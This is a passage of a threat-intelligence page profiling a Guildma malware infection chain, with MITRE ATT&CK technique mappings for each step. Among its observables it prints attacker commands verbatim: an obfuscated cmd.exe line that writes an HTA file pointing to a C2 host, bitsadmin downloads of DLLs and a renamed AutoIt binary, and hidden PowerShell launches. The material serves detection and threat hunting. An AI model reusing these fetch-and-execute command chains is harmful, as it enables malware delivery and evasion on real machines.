title="Direct link to heading">#</a></h4><ul><li>T1204.002 - User Execution: Malicious File</li><li>T1059.003 - Command and Scripting Interpreter: Windows Command Shell</li></ul><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="behaviors-and-observables-1"></a>Behaviors and Observables<a class="hash-link" href="#behaviors-and-observables-1" title="Direct link to heading">#</a></h4><table><thead><tr><th>Tech IDs</th><th>Behaviors</th><th>Observables</th></tr></thead><tbody><tr><td>T1204.002</td><td>User executed a <em>.LNK</em> file contained in the <em>ZIP</em> file.</td><td><em>Process Created</em>: <br>- <code>C:\Users\#{user}\AppData\Local\Temp\Rar$DRa2672.2359\TUP32980638916Y\599151.301.25077.7868139.LNK</code></td></tr><tr><td>T1059.003</td><td><em>.LNK</em> file triggered <em>CMD.exe</em> with obfuscated command-line</td><td><em>Process Created</em>: <br>- <code>\&quot;C:\\Windows\\System32\\cmd.exe\&quot; /V/D/c \&quot;seT sKk=script&amp;&amp;seT px=powershell&amp;&amp;SEt NEGG=C:\\Users\\Public\\Videos\\^YqW&amp;&amp;SEt SMO=.H&amp;&amp;SEt XQGZ=^&lt;!sKk!^&gt;try{v6POar c=\&#x27;!sKk!:\&#x27;;d=\&#x27;h6POTtP:\&#x27;;G6POetObj6POect(c+d+\&#x27;&amp;&amp;sET FIC=ZXEFMZXEFMwaa8.nolii.dateZXEFM?1ZXEFM\&#x27;);}catch(e){}close();^&lt;/!sKk!^&gt;&amp;&amp;sEt/^p YE8N=\&quot;%XQGZ:6PO=%%FIC:ZXEFM=/%\&quot;&lt;nul &gt; %NEGG%%SMO%ta\|!px! -Command \&quot;&amp; \&#x27;!NEGG!!SMO!ta\&#x27; \&quot;</code></td></tr></tbody></table><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="notes-1"></a>Notes<a class="hash-link" href="#notes-1" title="Direct link to heading">#</a></h4><ul><li>The command line establishes different variables (sKk, px, NEGG, SMO, XQGZ, FIC, YE8N) to execute a command</li></ul><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="threat-actor-used-cmd-to-run-obfuscated-command-that-drops-hta-file-for-defense-evasion"></a>Threat Actor used <em>CMD</em> to run obfuscated command that drops <em>HTA</em> file for Defense Evasion.<a class="hash-link" href="#threat-actor-used-cmd-to-run-obfuscated-command-that-drops-hta-file-for-defense-evasion" title="Direct link to heading">#</a></h3><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="tactic-2"></a>Tactic<a class="hash-link" href="#tactic-2" title="Direct link to heading">#</a></h4><ul><li>Defense Evasion</li></ul><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="techniques-2"></a>Techniques<a class="hash-link" href="#techniques-2" title="Direct link to heading">#</a></h4><ul><li>T1059.003 - Command and Scripting Interpreter: Windows Command Shell</li></ul><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="behaviors-and-observables-2"></a>Behaviors and Observables<a class="hash-link" href="#behaviors-and-observables-2" title="Direct link to heading">#</a></h4><table><thead><tr><th>Tech IDs</th><th>Behaviors</th><th>Observables</th></tr></thead><tbody><tr><td>T1059.003</td><td><em>CMD.exe</em> spawned with an obfuscated command-line</td><td><em>Process Created</em>: <br>- <code>C:\Windows\system32\cmd.exe  /S /D /c\&quot; sEt/p YE8N=\&quot;%XQGZ:6PO=%%FIC:ZXEFM=/%\&quot; 0&lt;nul 1&gt;%NEGG%%SMO%ta\&quot;</code></td></tr><tr><td>T1059.003</td><td>.hta file is created under C:\Users\Public\Videos folder</td><td><em>File Created</em>: <br>- <code>C:\\Users\\Public\\Videos\\YqW.Hta</code></td></tr></tbody></table><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="notes-2"></a>Notes<a class="hash-link" href="#notes-2" title="Direct link to heading">#</a></h4><ul><li>This file includes the URL where the malware will connect to download next stages payloads.</li><li>An HTML Application (HTA) is a Microsoft Windows program whose source code consists of HTML, Dynamic HTML, and one or more scripting languages supported by Internet Explorer, such as VBScript or JScript</li></ul><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="threat-actor-used-powershell-to-execute-hta-payload-via-mshta-for-defense-evasion"></a>Threat Actor used <em>PowerShell</em> to execute <em>HTA</em> payload via <em>MSHTA</em> for Defense Evasion.<a class="hash-link" href="#threat-actor-used-powershell-to-execute-hta-payload-via-mshta-for-defense-evasion" title="Direct link to heading">#</a></h3><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="tactic-3"></a>Tactic<a class="hash-link" href="#tactic-3" title="Direct link to heading">#</a></h4><ul><li>Defense Evasion</li></ul><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="techniques-3"></a>Techniques<a class="hash-link" href="#techniques-3" title="Direct link to heading">#</a></h4><ul><li>T1059.001 - Command and Scripting Interpreter: PowerShell</li><li>T1218.005 - Signed Binary Proxy Execution: Mshta</li></ul><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="behaviors-and-observables-3"></a>Behaviors and Observables<a class="hash-link" href="#behaviors-and-observables-3" title="Direct link to heading">#</a></h4><table><thead><tr><th>Tech IDs</th><th>Behaviors</th><th>Observables</th></tr></thead><tbody><tr><td>T1059.001</td><td>PowerShell command executed to load malicious .hta file</td><td><em>Process Created</em>: <br>- <code>powershell  -Command &quot;&amp; &#x27;C:\Users\Public\Videos\YqW.Hta&#x27; </code></td></tr><tr><td>T1218.005</td><td>mshta.exe is loaded to run the HTA script</td><td><em>Process Created</em>: <br>- <code>&quot;C:\\Windows\\System32\\mshta.exe&quot; &quot;C:\\Users\\Public\\Videos\\YqW.Hta&quot;</code></td></tr></tbody></table><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="notes-3"></a>Notes<a class="hash-link" href="#notes-3" title="Direct link to heading">#</a></h4><ul><li>This execution triggers different events in the system like Network and File events.</li></ul><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="threat-actor-used-mshta-to-orchestrate-the-download-of-guildma-dll-and-other-artifacts-via-bitsadmin-for-command-and-control"></a>Threat Actor used <em>MSHTA</em> to orchestrate the download of Guildma DLL and other artifacts via <em>BITSadmin</em> for Command And Control.<a class="hash-link" href="#threat-actor-used-mshta-to-orchestrate-the-download-of-guildma-dll-and-other-artifacts-via-bitsadmin-for-command-and-control" title="Direct link to heading">#</a></h3><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="tactic-4"></a>Tactic<a class="hash-link" href="#tactic-4" title="Direct link to heading">#</a></h4><ul><li>Command And Control</li></ul><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="techniques-4"></a>Techniques<a class="hash-link" href="#techniques-4" title="Direct link to heading">#</a></h4><ul><li>T1071.001 - Application Layer Protocol: Web Protocols</li><li>T1105 - Ingress Tool Transfer</li><li>T1218.005 - Signed Binary Proxy Execution: Mshta</li><li>T1197 - BITS Jobs</li><li>T1059.003 - Command and Scripting Interpreter: Windows Command Shell</li></ul><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="behaviors-and-observables-4"></a>Behaviors and Observables<a class="hash-link" href="#behaviors-and-observables-4" title="Direct link to heading">#</a></h4><table><thead><tr><th>Tech IDs</th><th>Behaviors</th><th>Observables</th></tr></thead><tbody><tr><td>T1071.001</td><td>MSHTA connects to C2 server to download files and execute additional malware</td><td><em>Network Accessed</em>: <code>104.21.76[.]96</code><br><em>Network Accessed</em>: <code>http://waa8.nolii[.]date/?1/</code></td></tr><tr><td>T1105</td><td>bitsadmin.exe is spawned by MSHTA to download Guildma DLL</td><td><em>Process Created</em>: <br>- <code>&quot;C:\\Windows\\System32\\bitsadmin.exe&quot; /transfer 46591720728 /priority foreground http://weta950iitv.keorgia[.]life/?530802004483151908759951449945921 &quot;C:\\Users\\Public\\Videos\\VEO46570203888O\\ctfmon.dll&quot;</code></td></tr><tr><td>T1218.005</td><td>Multiple text files are created by MSHTA after the HTA file execution</td><td><em>File Created</em>: <br>- <code>C:\\Users\\#{user}\\AppData\\Roaming\\Microsoft\\Windows\\Cookies\\HE6VS7YU.txt</code><br>- <code>C:\\Users\\#{user}\\AppData\\Roaming\\Microsoft\\Windows\\Cookies\\XJHKVD2B.txt</code><br>- <code>C:\\Users\\#{user}\\AppData\\Roaming\\Microsoft\\Windows\\Cookies\\3JVKRLFN.txt</code><br>- <code>C:\\Users\\#{user}\\AppData\\Local\\Microsoft\\Windows\\Temporary Internet Files\\Content.IE5\\BDW1XBVN\\0KG1IQBM.htm</code></td></tr><tr><td>T1197</td><td>MSHTA spawned multiple instances of bitsadmin.exe to download files</td><td><em>Process Created</em>: <br>- <code>&quot;C:\Windows\System32\bitsadmin.exe&quot; /transfer 59697582645 /priority foreground http://weta950iitv.keorgia[.]life/?49547426338677879 &quot;C:\Users\Public\Videos\VEO46570203888O\log32.dll&quot;</code><br>- <code>&quot;C:\Windows\System32\bitsadmin.exe&quot; /transfer 32546684239 /priority foreground http://weta950iitv.keorgia[.]life/?54819973696676725 &quot;C:\Users\Public\Videos\VEO46570203888O\log33.dll&quot;</code><br>- <code>&quot;C:\Windows\System32\bitsadmin.exe&quot; /transfer 23219779590 /priority foreground http://weta950iitv.keorgia[.]life/?69413452047686482 &quot;C:\Users\Public\Videos\VEO46570203888O\ctfmon.exe&quot;</code><br>- <code>&quot;C:\Windows\System32\bitsadmin.exe&quot; /transfer 39693815612 /priority foreground http://weta950iitv.keorgia[.]life/?56006860532636958 &quot;C:\Users\Public\Videos\VEO46570203888O\ctfmon.log&quot;</code></td></tr><tr><td>T1059.003</td><td>CMD.exe is launched by mshta.exe to write content into a file</td><td><em>Process Created</em>: <br>- <code>&quot;C:\\Windows\\System32\\cmd.exe&quot; /V /C &quot;echo C:\\Users\\Public\\Videos\\VEO46570203888O\&gt;C:\\Users\\Public\\lu&quot;&amp;&amp; exit</code></td></tr><tr><td>T1059.003</td><td>CMD.exe creates a file called lu (likely an internal flag used by the malware)</td><td><em>File Created</em>: <br>- <code>C:\\Users\\Public\\lu</code></td></tr></tbody></table><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="notes-4"></a>Notes<a class="hash-link" href="#notes-4" title="Direct link to heading">#</a></h4><ul><li>The content of the file is &#x27;C:\Users\Public\Videos\VEO46570203888O\&#x27;</li></ul><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="threat-actor-used-mshta-to-launch-a-powershell-command-that-loads-guildma-dll-for-defense-evasion"></a>Threat Actor used <em>MSHTA</em> to launch a <em>PowerShell</em> command that loads Guildma DLL for Defense Evasion.<a class="hash-link" href="#threat-actor-used-mshta-to-launch-a-powershell-command-that-loads-guildma-dll-for-defense-evasion" title="Direct link to heading">#</a></h3><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="tactic-5"></a>Tactic<a class="hash-link" href="#tactic-5" title="Direct link to heading">#</a></h4><ul><li>Defense Evasion</li></ul><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="techniques-5"></a>Techniques<a class="hash-link" href="#techniques-5" title="Direct link to heading">#</a></h4><ul><li>T1059.003 - Command and Scripting Interpreter: Windows Command Shell</li></ul><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="behaviors-and-observables-5"></a>Behaviors and Observables<a class="hash-link" href="#behaviors-and-observables-5" title="Direct link to heading">#</a></h4><table><thead><tr><th>Tech IDs</th><th>Behaviors</th><th>Observables</th></tr></thead><tbody><tr><td>T1059.003</td><td>Another CMD.exe is spawned by mshta.exe to execute PowerShell.exe</td><td><em>Process Created</em>: <br>- <code>&quot;C:\\Windows\\System32\\cmd.exe&quot; /c cd C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\&amp;&amp; ^start ^/W ^/MIN powershell -windowstyle hidden -Command &quot;&amp; &quot;C:\\Users\\Public\\Videos\\VEO46570203888O\\ctfmon.exe&quot; C:\\Users\\Public\\Videos\\VEO46570203888O\\ctfmon.log &quot;&amp;&amp; timeout 3600</code></td></tr></tbody></table><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="notes-5"></a>Notes<a class="hash-link" href="#notes-5" title="Direct link to heading">#</a></h4><ul><li>This CMD.exe is executed at the same time of bitsadmin.exe. Both are child process of mshta (possibly ADS)</li><li>Alternate Data Stream (ADS) is the ability of an NTFS file system (the main file system format in Windows) to store different streams of data, in addition to the default stream which is normally used for a file.</li></ul><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="threat-actor-used-powershell-to-launch-autoit3-script-for-defense-evasion"></a>Threat Actor used <em>PowerShell</em> to launch <em>AutoIt3</em> script for Defense Evasion.<a class="hash-link" href="#threat-actor-used-powershell-to-launch-autoit3-script-for-defense-evasion" title="Direct link to heading">#</a></h3><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="tactic-6"></a>Tactic<a class="hash-link" href="#tactic-6" title="Direct link to heading">#</a></h4><ul><li>Defense Evasion</li></ul><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="techniques-6"></a>Techniques<a class="hash-link" href="#techniques-6" title="Direct link to heading">#</a></h4><ul><li>T1059.001 - Command and Scripting Interpreter: PowerShell</li></ul><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="behaviors-and-observables-6"></a>Behaviors and Observables<a class="hash-link" href="#behaviors-and-observables-6" title="Direct link to heading">#</a></h4><table><thead><tr><th>Tech IDs</th><th>Behaviors</th><th>Observables</th></tr></thead><tbody><tr><td>T1059.001</td><td>PowerShell.exe is spawned by cmd.exe to execute the <em>AutoIt3</em> binary</td><td><em>Process Created</em>: <br>- <code>powershell  -windowstyle hidden -Command &quot;&amp; &quot;C:\\Users\\Public\\Videos\\VEO46570203888O\\ctfmon.exe&quot; &quot;C:\\Users\\Public\\Videos\\VEO46570203888O\\ctfmon.log&quot; &amp;&amp; timeout 3600&quot;</code></td></tr></tbody></table><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="notes-6"></a>Notes<a class="hash-link" href="#notes-6" title="Direct link to heading">#</a></h4><ul><li>ctfmon.exe is the legit binary of AutoIt3.</li></ul><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="threat-actor-used-a-renamed-copy-of-autoit3-interpreter-to-run-malicious-autoit3-scripts-to-launch-guildma-dll-for-execution"></a>Threat Actor used a renamed copy of <em>AutoIt3</em> interpreter to run malicious <em>AutoIt3</em> scripts to launch Guildma DLL for Execution.<a class="hash-link" href="#threat-actor-used-a-renamed-copy-of-autoit3-interpreter-to-run-malicious-autoit3-scripts-to-launch-guildma-dll-for-execution" title="Direct link to heading">#</a></h3><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="tactic-7"></a>Tactic<a class="hash-link" href="#tactic-7" title="Direct link to heading">#</a></h4><ul><li>Execution</li></ul><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="techniques-7"></a>Techniques<a class="hash-link" href="#techniques-7" title="Direct link to heading">#</a></h4><ul><li>T1059 - Command and Scripting Interpreter</li><li>T1036 - Masquerading</li></ul><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="behaviors-and-observables-7"></a>Behaviors and Observables<a class="hash-link" href="#behaviors-and-observables-7" title="Direct link to heading">#</a></h4><table><thead><tr><th>Tech IDs</th><th>Behaviors</th><th>Observables</th></tr></thead><tbody><tr><td>T1059<br>T1036</td><td>Renamed copy of <em>AutoIt3</em> interpreter (ctfmon.exe) is executed to load the <em>AutoIt3</em> script (ctfmon.log)</td><td><em>Process Created</em>: <br>- <code>&quot;C:\\Users\\Public\\Videos\\VEO46570203888O\\ctfmon.exe&quot;  C:\\Users\\Public\\Videos\\VEO46570203888O\\ctfmon.log</code></td></tr></tbody></table><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="notes-7"></a>Notes<a class="hash-link" href="#notes-7" title="Direct link to heading">#</a></h4><ul><li>The binary of <em>AutoIt3</em> is executed to load the <em>AutoIt3</em> script, which is responsible for loading the Guildma DLL afterwards</li></ul><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="threat-actor-used-autoit3-scripts-to-launch-guildma-dll-for-execution"></a>Threat Actor used <em>AutoIt3</em> scripts to launch <em>Guildma DLL</em> for Execution.<a class="hash-link" href="#threat-actor-used-autoit3-scripts-to-launch-guildma-dll-for-execution" title="Direct link to heading">#</a></h3><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="tactic-8"></a>Tactic<a class="hash-link" href="#tactic-8" title="Direct link to heading">#</a></h4><ul><li>Execution</li></ul><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="techniques-8"></a>Techniques<a class="hash-link" href="#techniques-8" title="Direct link to heading">#</a></h4><ul><li>T1059 - Command and Scripting Interpreter</li><li>T1497.003 - Virtualization/Sandbox Evasion: Time Based Evasion</li><li>T1059.003 - Command and Scripting Interpreter: Windows Command Shell</li></ul><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="behaviors-and-observables-8"></a>Behaviors and Observables<a class="hash-link" href="#behaviors-and-observables-8" title="Direct link to heading">#</a></h4><table><thead><tr><th>Tech IDs</th><th>Behaviors</th><th>Observables</th></tr></thead><tbody><tr><td>T1059</td><td>Dllhost.exe is launched by the <em>AutoIt3</em> interpreter.</td><td><em>Process Created</em>: <br>- <code>C:\Windows\System32\dllhost.exe</code></td></tr><tr><td>T1497.003</td><td>Timeout.exe is launched by CMD.exe</td><td><em>Process Created</em>: <br>- <code>timeout  3600</code></td></tr><tr><td>T1059.003</td><td>CMD.exe is spawned by mshta.exe to create another file in C:\Users\Public\Videos file</td><td><em>Process Created</em>: <br>- <code>&quot;C:\Windows\System32\cmd.exe&quot; /V /C &quot;echo gharobhnpuluguaoqzgezkk &gt;C:\Users\Public\Videos\VEO46570203888O\\r1.log&quot;&amp;&amp; exit</code></td></tr><tr><td>T1059.003</td><td>CMD.exe creates a file called r1.log</td><td><em>File Created</em>: <br>- <code>C:\\Users\\Public\\Videos\\VEO46570203888O\\r1.log</code></td></tr></tbody></table><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="notes-8"></a>Notes<a class="hash-link" href="#notes-8" title="Direct link to heading">#</a></h4><ul><li>The content of the file r1.log is &#x27;gharobhnpuluguaoqzgezkk&#x27;</li></ul></div></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages navigation"><div class="pagination-nav__item"><a class="pagination-nav__link" href="/ac3-threat-sightings/docs/Sightings/Raccoon_InfoStealer"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Â« Raccoon_InfoStealer</div></a></div><div class="pagination-nav__item pagination-nav__item--next"><a class="pagination-nav__link" href="/ac3-threat-sightings/docs/Sightings/TA551-Phishing"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">TA551-Phishing Â»</div></a></div></nav></div></div><div class="col col--3"><div class="tableOfContents_vrFS thin-scrollbar"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#overview" class="table-of-contents__link">Overview</a><ul><li><a href="#references" class="table-of-contents__link">References:</a></li><li><a href="#threat-actor-activity" class="table-of-contents__link">Threat Actor Activity</a></li><li><a href="#count-of-documented-ttps-by-tactic" class="table-of-contents__link">Count of documented TTPs by Tactic</a></li><li><a href="#attack-flow" class="table-of-contents__link">Attack Flow</a></li></ul></li><li><a href="#tactics-techniques-and-procedures" class="table-of-contents__link">Tactics, Techniques and Procedures</a></li><li><a href="#tactics-techniques-procedures-observables-and-notes" class="table-of-contents__link">Tactics, Techniques, Procedures, Observables and Notes</a></li><li><a href="#ttp-profiles-with-observables" class="table-of-contents__link">TTP Profiles with Observables</a><ul><li><a href="#threat-actor-used-malicious-zip-file-to-lure-users-for-initial-access" class="table-of-contents__link">Threat Actor used malicious <em>ZIP</em> file to lure users for Initial Access.</a></li><li><a href="#threat-actor-used-malicious-lnk-file-to-lure-users-for-execution" class="table-of-contents__link">Threat Actor used malicious <em>.LNK</em> file to lure users for Execution.</a></li><li><a href="#threat-actor-used-cmd-to-run-obfuscated-command-that-drops-hta-file-for-defense-evasion" class="table-of-contents__link">Threat Actor used <em>CMD</em> to run obfuscated command that drops <em>HTA</em> file for Defense Evasion.</a></li><li><a href="#threat-actor-used-powershell-to-execute-hta-payload-via-mshta-for-defense-evasion" class="table-of-contents__link">Threat Actor used <em>PowerShell</em> to execute <em>HTA</em> payload via <em>MSHTA</em> for Defense Evasion.</a></li><li><a href="#threat-actor-used-mshta-to-orchestrate-the-download-of-guildma-dll-and-other-artifacts-via-bitsadmin-for-command-and-control" class="table-of-contents__link">Threat Actor used <em>MSHTA</em> to orchestrate the download of Guildma DLL and other artifacts via <em>BITSadmin</em> for Command And Control.</a></li><li><a href="#threat-actor-used-mshta-to-launch-a-powershell-command-that-loads-guildma-dll-for-defense-evasion" class="table-of-contents__link">Threat Actor used <em>MSHTA</em> to launch a <em>PowerShell</em> command that loads Guildma DLL for Defense Evasion.</a></li><li><a href="#threat-actor-used-powershell-to-launch-autoit3-script-for-defense-evasion" class="table-of-contents__link">Threat Actor used <em>PowerShell</em> to launch <em>AutoIt3</em> script for Defense Evasion.</a></li><li><a href="#threat-actor-used-a-renamed-copy-of-autoit3-interpreter-to-run-malicious-autoit3-scripts-to-launch-guildma-dll-for-execution" class="table-of-contents__link">Threat Actor used a renamed copy of <em>AutoIt3</em> interpreter to run malicious <em>AutoIt3</em> scripts to launch Guildma DLL for Execution.</a></li><li><a href="#threat-actor-used-autoit3-scripts-to-launch-guildma-dll-for-execution" class="table-of-contents__link">Threat Actor used <em>AutoIt3</em> scripts to launch <em>Guildma DLL</em> for Execution.</a></li></ul></li></ul></div></div></div></div></main></div></div></div>
<script src="/ac3-threat-sightings/assets/js/runtime~main.943e43ad.js"></script>
<script src="/ac3-threat-sightings/assets/js/main.263aa71a.js"></script>
</body>
</html>